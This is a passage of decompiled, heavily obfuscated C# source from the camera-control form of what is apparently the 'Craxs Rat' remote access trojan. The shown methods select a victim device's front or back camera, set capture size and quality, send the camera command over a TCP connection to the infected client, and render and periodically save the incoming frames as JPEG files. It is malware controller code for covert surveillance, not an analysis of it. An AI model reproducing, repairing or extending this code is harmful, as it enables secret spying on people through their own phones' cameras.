            num1 = (int) num2 * 1147685571 ^ 1733765154;
            continue;
          case 1:
            CameraManager.SetWindowPos(this.Handle, hWndInsertAfter, 0, 0, 0, 0, 3U);
            ((CraxsSettings) this).keepmeto = true;
            num1 = (int) num2 * -311285964 ^ -1559984546;
            continue;
          case 2:
            goto label_1;
          case 3:
            hWndInsertAfter = new IntPtr(-2);
            num1 = (int) num2 * -161000738 ^ 1271200420;
            continue;
          case 4:
            this.cmbofoucs.Text = EXGuarder.\u00369225C6F;
            num1 = (int) num2 * 1383757968 ^ -461835075;
            continue;
          case 5:
            goto label_3;
          case 6:
            // ISSUE: reference to a compiler-generated field
            this.ClientPic.Image = (Image) ((Data._Closure\u0024__39\u002D17) ((ContactsManager) this).classClient).Wallpaper;
            this.Text = ((ContactsManager) this).Title;
            this.TOpacity.Interval = Settings.T_Interval;
            this.tranlsateme();
            this.Focus();
            this.TOpacity.Enabled = true;
            num1 = (int) num2 * -1513436861 ^ -511160681;
            continue;
          default:
            goto label_9;
        }
      }
label_3:
      return;
label_9:;
    }

    private void Frames_Tick(object sender, EventArgs e)
    {
      ((ContactsManager) this).FPS = ((ContactsManager) this).FPSTMP;
label_1:
      int num1 = -899369827;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 * -240395673 ^ ~-1455706487 - (537309187 - 2023517239) - -(1227386999 * -1714394127) - -1259732074) * 103268047)) % 3U)
        {
          case 0:
            goto label_3;
          case 1:
            ((ContactsManager) this).FPSTMP = 0;
            ((ContactsManager) this).SizeFrame = EXGuarder.\u0030F3C7251;
            num1 = (int) num2 * -996375799 ^ 1610333859;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    private void CAM0_MouseHover(object sender, EventArgs e)
    {
    }

    private void CAM0_MouseLeave(object sender, EventArgs e)
    {
    }

    public void UpdateFPS()
    {
      // ISSUE: method pointer
      this.Invoke((Delegate) new EXGuarder((object) this, __methodptr(_Lambda\u0024__139\u002D0)));
    }

    public Image RotateFlip(Image imag)
    {
      Image image;
      try
      {
        ((ContactsManager) this).TempImage.Image = imag;
        if (((ContactsManager) this).TempImage != null)
        {
label_1:
          int num1 = 763670498;
          string keYsx;
          while (true)
          {
            uint num2;
            switch ((num2 = (uint) (~((num1 - ((--1280725338 ^ 1454842529 - 39758343 ^ (1036644230 ^ 145003890) + 1195547150) + ~((-1469363995 ^ -142234537) - 436961391) ^ -(~--1579637915 * -1793542493)) - ~((2066023241 - 181610343) * 1407576419 + (~-79684052 ^ ~-994179903)) - ~(1363797555 - 1310649238 ^ 514355248)) * 780342539) * -1687548709)) % 16U)
            {
              case 0:
                num1 = (int) num2 * -1349158422 ^ 1172809821;
                continue;
              case 1:
                int num3 = Operators.CompareString(keYsx, EXGuarder.\u00321553B79, false) != 0 ? -1750039812 : (num3 = 1214584489);
                num1 = num3 ^ (int) num2 * -1455226847;
                continue;
              case 2:
                ((ContactsManager) this).TempImage.Tag = (object) EXGuarder.\u00344281A47;
                num1 = (int) num2 * 1258894860 ^ 719810637;
                continue;
              case 3:
                int num4 = Operators.CompareString(keYsx, EXGuarder.\u0030F557517, false) == 0 ? -155989927 : (num4 = -1147689660);
                num1 = num4 ^ (int) num2 * 647644911;
                continue;
              case 5:
                ((ContactsManager) this).TempImage.Image.RotateFlip(RotateFlipType.RotateNoneFlipX);
                num1 = (int) num2 * 52108778 ^ 2042939329;
                continue;
              case 6:
                ((ContactsManager) this).TempImage.Image.RotateFlip(RotateFlipType.Rotate180FlipX);
                ((ContactsManager) this).TempImage.Tag = (object) EXGuarder.\u003514A4607;
                num1 = 1110892733;
                continue;
              case 7:
                int num5 = Operators.CompareString(keYsx, EXGuarder.\u00330312377, false) == 0 ? 207369807 : (num5 = -1851980436);
                num1 = num5 ^ (int) num2 * -1914925024;
                continue;
              case 8:
                image = ((ContactsManager) this).TempImage.Image;
                num1 = -1982650946;
                continue;
              case 9:
                ((ContactsManager) this).TempImage.Image.RotateFlip(RotateFlipType.Rotate90FlipNone);
                ((ContactsManager) this).TempImage.Tag = (object) EXGuarder.\u0030518055A;
                num1 = 1110892733;
                continue;
              case 10:
                goto label_1;
              case 11:
                keYsx = ((ContactsManager) this).KEYsx;
                num1 = (int) num2 * 605228563 ^ 2000069627;
                continue;
              case 12:
                int num6 = Operators.CompareString(keYsx, EXGuarder.\u00345100239, false) == 0 ? 1357811044 : (num6 = 1346778994);
                num1 = num6 ^ (int) num2 * 520010515;
                continue;
              case 13:
                ((ContactsManager) this).TempImage.Image.RotateFlip(RotateFlipType.Rotate270FlipNone);
                num1 = -1585204137;
                continue;
              case 14:
                ((ContactsManager) this).TempImage.Tag = (object) EXGuarder.\u00373222707;
                num1 = (int) num2 * 2077976285 ^ 1722181915;
                continue;
              case 15:
                goto label_18;
              default:
                goto label_17;
            }
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_17:
      image = (Image) null;
label_18:
      return image;
    }

    private void Button4_Click(object sender, EventArgs e)
    {
    }

    private void Button3_Click(object sender, EventArgs e)
    {
    }

    private void CameraManager_FormClosing(object sender, FormClosingEventArgs e)
    {
      // ISSUE: reference to a compiler-generated field
      ((ContactsManager._Closure\u0024__) this).boSave = false;
label_1:
      int num1 = -239861016;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((num1 * -614155429 + (-308352100 + -~-1268474762) * 1663273547) * 1090162705)) % 9U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            ((Data._Closure\u0024__39\u002D8) ((ContactsManager) this).classCamera).qit = true;
            num1 = (int) num2 * -1206607742 ^ 86365556;
            continue;
          case 1:
            this.DrakeUILampLED1.Enabled = false;
            this.DrakeUILampLED1.Visible = false;
            this.DrakeUILampLED1.Blink = false;
            num1 = (int) num2 * 298777860 ^ 1125545876;
            continue;
          case 2:
            goto label_3;
          case 3:
            this.Frames.Stop();
            num1 = (int) num2 * -1358563552 ^ 1782884327;
            continue;
          case 4:
            this.DrakeUILampLED1.Dispose();
            this.Frames.Enabled = false;
            int num3 = !((CraxsSettings) this).Changed ? -1568263538 : (num3 = 1025391383);
            num1 = num3 ^ (int) num2 * -1041742412;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated field
            ((ContactsManager) this).classCamera.Close(((Data._Closure\u0024__) ((ContactsManager) this).classCamera).myClient);
            num1 = (int) num2 * -1622639853 ^ -1094223641;
            continue;
          case 6:
            this.Frames.Dispose();
            num1 = (int) num2 * -1531009470 ^ 1111464774;
            continue;
          case 7:
            int num4 = ((ContactsManager) this).classCamera == null ? 1853679656 : (num4 = 1264493212);
            num1 = num4 ^ (int) num2 * 2052044145;
            continue;
          case 8:
            goto label_1;
          default:
            goto label_11;
        }
      }
label_3:
      return;
label_11:;
    }

    public void Selected(string V)
    {
      try
      {
        if (((ContactsManager) this).classClient == null)
          return;
label_1:
        int num1 = 1846462686;
        int num2;
        Client classClient;
        string[] strArray1;
        TcpClient client;
        int num3;
        string str1;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (-(num1 * -1122725711 * 526927409 * 2007326649) - ~-274940895)) % 10U)
          {
            case 0:
              strArray1 = ((Data) classClient).Keys.Split(':');
              num1 = (int) num4 * 1189800067 ^ 1754320719;
              continue;
            case 2:
              num2 = 1;
              num1 = (int) num4 * 1200047706 ^ -1268006049;
              continue;
            case 3:
              num2 = 0;
              num1 = -1390208878;
              continue;
            case 4:
              num3 = 1;
              str1 = EXGuarder.\u0031D373E6D;
              num1 = 852269405;
              continue;
            case 5:
              int num5 = Operators.CompareString(this.cmbofoucs.Text, EXGuarder.\u00349756935, false) != 0 ? 1403773114 : (num5 = 1279108083);
              num1 = num5 ^ (int) num4 * 1612597985;
              continue;
            case 6:
              classClient = ((ContactsManager) this).classClient;
              client = ((ContactsManager) this).Client;
              num1 = (int) num4 * -151769308 ^ -389618228;
              continue;
            case 7:
              goto label_1;
            case 8:
              if (Operators.CompareString(((CraxsSettings) this).CamerID, EXGuarder.\u0035E5B5C46, false) != 0)
              {
                num1 = (int) num4 * 64093745 ^ 126900702;
                continue;
              }
              goto label_39;
            case 9:
              num1 = (int) num4 * -167691893 ^ -975261709;
              continue;
            default:
              goto label_12;
          }
        }
label_39:
        return;
label_12:
        string str2 = EXGuarder.\u0031D373E6D;
        try
        {
          if (this.combosizes.Visible)
          {
label_14:
            int num6 = -1299891194;
            string[] strArray2;
            while (true)
            {
              uint num7;
              switch ((num7 = (uint) (-(num6 * -1122725711 * 526927409 * 2007326649) - ~-274940895)) % 5U)
              {
                case 0:
                  str1 = strArray2[0];
                  num6 = (int) num7 * 1335724155 ^ -829736101;
                  continue;
                case 2:
                  goto label_14;
                case 3:
                  str2 = strArray2[1];
                  num6 = (int) num7 * 2141085830 ^ -1141035774;
                  continue;
                case 4:
                  strArray2 = this.combosizes.Text.Split('x');
                  num6 = (int) num7 * -592714516 ^ 1011065084;
                  continue;
                default:
                  goto label_25;
              }
            }
          }
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
label_20:
          int num8 = -1736262517;
          while (true)
          {
            uint num9;
            switch ((num9 = (uint) (-(num8 * -1122725711 * 526927409 * 2007326649) - ~-274940895)) % 3U)
            {
              case 0:
                goto label_20;
              case 1:
                str1 = Conversions.ToString(460);
                str2 = Conversions.ToString(840);
                ProjectData.ClearProjectError();
                num8 = (int) num9 * 341268277 ^ -902736889;
                continue;
              default:
                goto label_25;
            }
          }
        }
label_25:
        string text = this.comboqualty.Text;
label_26:
        int num10 = -1994359703;
        object[] ParametersObjects1;
        while (true)
        {
          uint num11;
          switch ((num11 = (uint) (-(num10 * -1122725711 * 526927409 * 2007326649) - ~-274940895)) % 8U)
          {
            case 0:
              goto label_35;
            case 1:
              // ISSUE: reference to a compiler-generated field
              int num12 = !((Data.VB\u0024StateMachine_39_HandelData) classClient).Isv4 ? 1779981833 : (num12 = 102867156);
              num10 = num12 ^ (int) num11 * 285060433;
              continue;
            case 2:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              object[] ParametersObjects2 = new object[4]
              {
                (object) client,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + V + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.getCamera + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num2) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num3) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u0035E5B5C46),
                (object) classClient
              };
              classClient.SendMessage(ParametersObjects2);
              num10 = 1346622631;
              continue;
            case 3:
              this.CAM0.Image = (Image) Craxs_Rat.My.Resources.Resources.onloading;
              num10 = -1712852874;
              continue;
            case 4:
              this.statustext.Text = EXGuarder.\u00363650171;
              num10 = (int) num11 * -1669133725 ^ -250799034;
              continue;
            case 5:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              ParametersObjects1 = new object[4]
              {
                (object) client,
                (object) (Client.KeysClient2 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + V + EXGuarder.\u0033C735B58 + str1 + EXGuarder.\u0033C735B58 + str2 + EXGuarder.\u0033C735B58 + text + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[0] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + strArray1[1] + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.getCamera + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num2) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Conversions.ToString(num3) + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Data.VB\u0024StateMachine_39_HandelData.SPL_ARRAY + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + ((Data) classClient).ClientRemoteAddress),
                (object) Codes.Encoding().GetBytes(EXGuarder.\u0035E5B5C46),
                (object) classClient
              };
              num10 = (int) num11 * -473333250 ^ 1492112781;
              continue;
            case 6:
              goto label_26;
            case 7:
              classClient.SendMessage(ParametersObjects1);
              num10 = (int) num11 * 4422289 ^ -1878607320;
              continue;
            default:
              goto label_28;
          }
        }
label_35:
        return;
label_28:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
label_37:
        int num13 = 1891969065;
        while (true)
        {
          uint num14;
          switch ((num14 = (uint) (-(num13 * -1122725711 * 526927409 * 2007326649) - ~-274940895)) % 3U)
          {
            case 0:
              goto label_37;
            case 1:
              goto label_24;
            case 2:
              ProjectData.ClearProjectError();
              num13 = (int) num14 * -1598287366 ^ 504545282;
              continue;
            default:
              goto label_22;
          }
        }
label_24:
        return;
label_22:;
      }
    }

    private void DrakeUIButton2_Click(object sender, EventArgs e)
    {
      if (!((CraxsSettings) this).Changed)
        goto label_7;
label_1:
      int num1 = -1819132686;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (~(999685102 - 77975457 * (-1176727186 * -126966847) + -(392869741 * (-912628384 - 940946737))) - num2 ^ -1080743459 * (1898460394 ^ -1399376764 ^ 2005774120 + 2147346613) - (1611525299 - ---2091689694) ^ 1990963153 - (1114835116 + 608864738 + -1609049749 * 425019104))) % 7U)
        {
          case 0:
            this.CAM0.Image = (Image) null;
            num1 = (int) num3 * -1381546178 ^ -1735295823;
            continue;
          case 2:
            goto label_7;
          case 3:
            goto label_1;
          case 4:
            ((CraxsSettings) this).Changed = false;
            int num4 = ((ContactsManager) this).classCamera == null ? 1387125974 : (num4 = 1673892050);
            num1 = num4 ^ (int) num3 * -358680444;
            continue;
          case 5:
            // ISSUE: reference to a compiler-generated field
            ((ContactsManager) this).classCamera.Close(((Data._Closure\u0024__) ((ContactsManager) this).classCamera).myClient);
            num1 = (int) num3 * 2101634809 ^ -761836196;
            continue;
          case 6:
            this.statustext.Text = EXGuarder.\u0030D36553E;
            // ISSUE: reference to a compiler-generated field
            ((Data._Closure\u0024__39\u002D8) ((ContactsManager) this).classCamera).qit = true;
            num1 = (int) num3 * 1367518868 ^ 356769619;
            continue;
          default:
            goto label_8;
        }
      }
label_8:
      this.Sbtn.Enabled = false;
      this.Button3.Enabled = false;
      return;
label_7:
      this.startbtn.Enabled = true;
      num1 = 1041074990;
      goto label_2;
    }

    private void DrakeUIButton1_Click_2(object sender, EventArgs e)
    {
    }

    private void DrakeUIButton2_Click_1(object sender, EventArgs e)
    {
    }

    private void Addpo_Click(object sender, EventArgs e)
    {
      if (this.CAM0.Image == null)
        return;
label_1:
      int num1 = 800088558;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-(num1 * 265586415) - ~(630653802 - 729778405 - (407987944 - 1083267807))) * -435165485)) % 16U)
        {
          case 0:
            // ISSUE: reference to a compiler-generated field
            ((ContactsManager._Closure\u0024__) this).boSave = false;
            num1 = (int) num2 * -1279478774 ^ 1756938400;
            continue;
          case 1:
            int num3 = Operators.CompareString(this.Button3.Tag.ToString(), EXGuarder.\u00311560D71, false) != 0 ? -1582996523 : (num3 = 1002454927);
            num1 = num3 ^ (int) num2 * -2055890985;
            continue;
          case 2:
            this.Button3.ForeColor = Color.FromArgb(157, 5, 17);
            this.savetimer.Stop();
            this.Button3.Text = EXGuarder.\u0035B351B4A;
            num1 = (int) num2 * -2123349552 ^ 617602683;
            continue;
          case 3:
            this.Button3.Text = EXGuarder.\u003051B1429;
            this.Button3.ForeColor = Color.Lime;
            // ISSUE: reference to a compiler-generated field
            ((ContactsManager._Closure\u0024__) this).boSave = true;
            num1 = (int) num2 * -498167514 ^ -868067918;
            continue;
          case 4:
            goto label_1;
          case 5:
            Process.Start(str);
            this.Button3.ForeColor = Color.White;
            this.Button3.BackColor = Color.Transparent;
            num1 = 1678154659;
            continue;
          case 6:
            this.DrakeUILampLED1.Enabled = false;
            this.DrakeUILampLED1.Visible = false;
            this.DrakeUILampLED1.Blink = false;
            num1 = (int) num2 * 1453192780 ^ -100742610;
            continue;
          case 7:
            goto label_18;
          case 8:
            // ISSUE: reference to a compiler-generated field
            str = ((ContactsManager._Closure\u0024__) this).tmpFolderUSER + EXGuarder.\u003404F0A65;
            num1 = (int) num2 * 334670782 ^ -491834627;
            continue;
          case 9:
            this.Button3.Tag = (object) EXGuarder.\u00311560D71;
            num1 = (int) num2 * -482594513 ^ -1375225442;
            continue;
          case 10:
            this.DrakeUILampLED1.Visible = true;
            this.DrakeUILampLED1.Blink = true;
            num1 = (int) num2 * -1115712103 ^ -576212595;
            continue;
          case 11:
            Directory.CreateDirectory(str);
            num1 = (int) num2 * 441556555 ^ 2071557219;
            continue;
          case 12:
            this.Button3.Tag = (object) EXGuarder.\u0036F513648;
            this.savetimer.Start();
            num1 = (int) num2 * -785678276 ^ 927600708;
            continue;
          case 13:
            int num4;
            num1 = num4 = Operators.CompareString(this.Button3.Tag.ToString(), EXGuarder.\u0036F513648, false) != 0 ? -712444480 : (num4 = -1266150971);
            continue;
          case 14:
            int num5 = Directory.Exists(str) ? 1779446622 : (num5 = 1039239496);
            num1 = num5 ^ (int) num2 * -1261538218;
            continue;
          case 15:
            this.DrakeUILampLED1.Enabled = true;
            num1 = (int) num2 * -1058608528 ^ -141947103;
            continue;
          default:
            goto label_19;
        }
      }
label_18:
      return;
label_19:;
    }

    private void DrakeUIAvatar2_Click(object sender, EventArgs e)
    {
      if (this.CAM0.Image == null)
        return;
label_1:
      int num1 = 1675710660;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (23015732 - ((17514132 - 667376025 ^ 272973019 * -1750558645) - -(num2 * -1405818433 * 1975903585) + ~1986050940))) % 13U)
        {
          case 0:
            int num4;
            num1 = num4 = Operators.CompareString(((ContactsManager) this).KEYsx, EXGuarder.\u0031C074D66, false) != 0 ? -729862303 : (num4 = 485275852);
            continue;
          case 1:
            int num5;
            num1 = num5 = Operators.CompareString(((ContactsManager) this).KEYsx, EXGuarder.\u00330033A5A, false) != 0 ? -1152932762 : (num5 = -1061289433);
            continue;
          case 2:
            goto label_1;
          case 3:
            goto label_15;
          case 4:
            ((ContactsManager) this).KEYsx = EXGuarder.\u00365242219;
            num1 = 42572002;
            continue;
          case 5:
            ((ContactsManager) this).KEYsx = EXGuarder.\u00365242219;
            num1 = (int) num3 * 2041332362 ^ -1153230818;
            continue;
          case 6:
            num1 = (int) num3 * -489103536 ^ 369485554;
            continue;
          case 7:
            int num6;
            num1 = num6 = Operators.CompareString(((ContactsManager) this).KEYsx, EXGuarder.\u00373034F01, false) != 0 ? 1438290806 : (num6 = 1156756510);
            continue;
          case 8:
            ((ContactsManager) this).KEYsx = EXGuarder.\u0031C074D66;
            num1 = (int) num3 * -1474493844 ^ -761320542;
            continue;
          case 9:
            int num7 = Operators.CompareString(((ContactsManager) this).KEYsx, EXGuarder.\u00365242219, false) != 0 ? 1095688756 : (num7 = 465482941);
            num1 = num7 ^ (int) num3 * -1445396170;
            continue;
          case 10:
            num1 = (int) num3 * -755760759 ^ 89531773;
            continue;
          case 11:
            ((ContactsManager) this).KEYsx = EXGuarder.\u00373034F01;
            num1 = (int) num3 * 1519491150 ^ -1154765780;
            continue;
          case 12:
            ((ContactsManager) this).KEYsx = EXGuarder.\u00330033A5A;
            num1 = (int) num3 * -521114566 ^ -1032563364;
            continue;
          default:
            goto label_16;
        }
      }
label_15:
      return;
label_16:;
    }

    private void Savetimer_Tick(object sender, EventArgs e)
    {
      try
      {
        // ISSUE: reference to a compiler-generated field
        string path = ((ContactsManager._Closure\u0024__) this).tmpFolderUSER + EXGuarder.\u003254D3C5D;
label_1:
        int num1 = 936419413;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(~num1 * -1032213821) ^ ~(-1831727824 - -1047421070))) % 10U)
          {
            case 0:
              Directory.CreateDirectory(path);
              num1 = (int) num2 * -1061458848 ^ 1707396594;
              continue;
            case 1:
              int num3 = !((CraxsSettings) this).newphoto ? -471484093 : (num3 = -1740401977);
              num1 = num3 ^ (int) num2 * -1013567382;
              continue;
            case 2:
              this.savetimer.Stop();
              this.savetimer.Dispose();
              num1 = -948745615;
              continue;
            case 3:
              int num4 = Directory.Exists(path) ? 75480609 : (num4 = 32740950);
              num1 = num4 ^ (int) num2 * 1763145681;
              continue;
            case 4:
              // ISSUE: reference to a compiler-generated field
              int num5 = !((ContactsManager._Closure\u0024__) this).boSave ? -2033165641 : (num5 = 1859989510);
              num1 = num5 ^ (int) num2 * -1628433545;
              continue;
            case 5:
              this.CAM0.Image.Save(path + EXGuarder.\u00309475834 + DateAndTime.Now.ToString(EXGuarder.\u0031D0F555B) + EXGuarder.\u003595D6900, ImageFormat.Jpeg);
              num1 = (int) num2 * 409577765 ^ -1525143260;
              continue;
            case 6:
              goto label_3;
            case 7:
              goto label_1;
            case 8:
              ((CraxsSettings) this).newphoto = false;
              num1 = (int) num2 * 492888901 ^ 942964096;
              continue;
            case 9:
              int num6;
              num1 = num6 = !Directory.Exists(path) ? -948745615 : (num6 = 91967994);
              continue;
            default:
              goto label_13;
          }
        }
label_3:
        return;
label_13:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void DrakeUIButton1_Click_3(object sender, EventArgs e)
    {
      string text = this.combocam.Text;
      if (Operators.CompareString(text, EXGuarder.\u003052D1523, false) == 0)
        goto label_10;
label_1:
      int num1 = -668629565;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) -~(num1 * -90837949)) % 11U)
        {
          case 0:
            goto label_1;
          case 1:
            this.statustext.Text = EXGuarder.\u0033223301A;
            this.Sbtn.Enabled = true;
            num1 = (int) num2 * 1217770343 ^ -1056671845;
            continue;
          case 2:
            int num3 = Operators.CompareString(text, EXGuarder.\u00351185918, false) != 0 ? -1146337726 : (num3 = -1674964182);
            num1 = num3 ^ (int) num2 * -2090641584;
            continue;
          case 3:
            ((CraxsSettings) this).SelectedCamera = EXGuarder.\u003500C4E26;
            num1 = (int) num2 * 1618357497 ^ 270657470;
            continue;
          case 4:
            this.startbtn.Enabled = false;
            ((CraxsSettings) this).CamerID = EXGuarder.\u0033C747449;
            this.Selected(EXGuarder.\u0033C747449);
            ((CraxsSettings) this).SelectedCamera = EXGuarder.\u003531D1805;
            num1 = (int) num2 * 1975228286 ^ -1518485204;
            continue;
          case 5:
            goto label_3;
          case 6:
            ((CraxsSettings) this).CamerID = EXGuarder.\u0035D6E652F;
            this.Selected(EXGuarder.\u0035D6E652F);
            num1 = (int) num2 * -234663850 ^ 14399441;
            continue;
          case 7:
            this.Sbtn.Enabled = true;
            num1 = (int) num2 * 1195868113 ^ 1155842345;
            continue;
          case 8:
            goto label_10;
          case 9:
            num1 = (int) num2 * 481266343 ^ 331716441;
            continue;
          case 10:
            this.startbtn.Enabled = false;
            num1 = (int) num2 * 1189145998 ^ 1300189084;
            continue;
          default:
            goto label_13;
        }
      }
label_3:
      return;
label_13:
      return;
label_10:
      this.statustext.Text = EXGuarder.\u0030F757129;
      num1 = 2144381936;
      goto label_2;
    }

    private void DrakeUIButtonIcon1_Click(object sender, EventArgs e)
    {
      if (Operators.CompareString(this.hidetoolbtn.TagString, EXGuarder.\u0031C72516B, false) != 0)
        goto label_7;
label_1:
      int num1 = 365266006;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ~~-(-num1 ^ -(~-1512651057 ^ -1656182267) + (-(-1636173639 ^ -616006478) ^ 1384292765))) % 6U)
        {
          case 0:
            goto label_1;
          case 1:
            this.hidetoolbtn.TagString = EXGuarder.\u0031D394356;
            this.Panel2.Enabled = false;
            num1 = (int) num2 * -1761683355 ^ -1661587669;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_7;
          case 4:
            this.Panel2.Enabled = true;
            this.Panel2.Visible = true;
            num1 = (int) num2 * -12650187 ^ -1871784815;
            continue;
          case 5:
            this.Panel2.Visible = false;
            num1 = (int) num2 * 721483510 ^ -896764321;
            continue;
          default:
            goto label_8;
        }
      }
label_3:
      return;
label_8:
      return;
label_7:
      this.hidetoolbtn.TagString = EXGuarder.\u0031C72516B;
      num1 = 1068366253;
      goto label_2;
    }

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool SetWindowPos(
      IntPtr hWnd,
      IntPtr hWndInsertAfter,
      int X,
      int Y,
      int cx,
      int cy,
      uint uFlags);

    private void DrakeUIButtonIcon1_Click_1(object sender, EventArgs e)
    {
      if (!((CraxsSettings) this).keepmeto)
        goto label_6;
label_1:
      int num1 = 356182206;
label_2:
      while (true)
      {
        int num2 = num1;
        uint num3;
        IntPtr hWndInsertAfter;
        switch ((num3 = (uint) ((~254381581 - ~(num2 - (-(1866417578 + (--538479375 ^ -1500967140)) ^ ~(-243202648 - 620249843 + --1769846289 ^ ~~1943770462))) * 1694663209 * 171494759) * 1789896039)) % 8U)
        {
          case 0:
            goto label_6;
          case 1:
            this.pinbtn.ForeColor = Color.Lime;
            CameraManager.SetWindowPos(this.Handle, new IntPtr(-1), 0, 0, 0, 0, 3U);
            ((CraxsSettings) this).keepmeto = false;
            num1 = (int) num3 * 1758695279 ^ 1572151160;
            continue;
          case 2:
            num1 = (int) num3 * -890175686 ^ 847869180;
            continue;
          case 3:
            goto label_3;
          case 4:
            hWndInsertAfter = new IntPtr(-2);
            num1 = (int) num3 * -1145403662 ^ -2033950413;
            continue;
          case 5:
            ((CraxsSettings) this).keepmeto = true;
            num1 = (int) num3 * -1491592475 ^ -1633575407;
            continue;
          case 6:
            CameraManager.SetWindowPos(this.Handle, hWndInsertAfter, 0, 0, 0, 0, 3U);
            num1 = (int) num3 * 1526506385 ^ -574312284;
            continue;
          case 7:
            goto label_1;
          default:
            goto label_10;
        }
      }
label_3:
      return;
label_10:
      return;
label_6:
      this.pinbtn.ForeColor = Color.Red;
      num1 = 1801967585;
      goto label_2;
    }

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public extern CameraManager(object TargetObject, IntPtr TargetMethod);

    [MethodImpl(MethodCodeType = MethodCodeType.Runtime)]
    public virtual extern IAsyncResult BeginInvoke(
      object[] objs,
      AsyncCallback DelegateCallback,
      object DelegateAsyncState);

    public delegate void addsizedele(object[] objs);
  }
}
